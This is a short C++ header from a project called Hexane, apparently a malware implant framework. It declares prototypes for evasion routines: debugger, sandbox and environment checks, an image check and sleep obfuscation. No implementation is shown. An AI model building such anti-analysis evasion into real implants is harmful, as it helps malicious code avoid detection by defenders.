#ifndef HEXANE_OPSEC_HPP
#define HEXANE_OPSEC_HPP
#include <monolith.hpp>
#include <core/include/corelib.hpp>
#include <core/include/commands.hpp>
#include <core/include/utils.hpp>

namespace Opsec {
    FUNCTION BOOL CheckTime();
    FUNCTION VOID SeCheckDebugger();
    FUNCTION VOID SeCheckSandbox();
    FUNCTION VOID SeCheckEnvironment();
    FUNCTION VOID RuntimeSecurityCheck();
    FUNCTION VOID SeImageCheck(PIMAGE img, PIMAGE proc);
    FUNCTION VOID SleepObf();
}

#endif //HEXANE_OPSEC_HPP
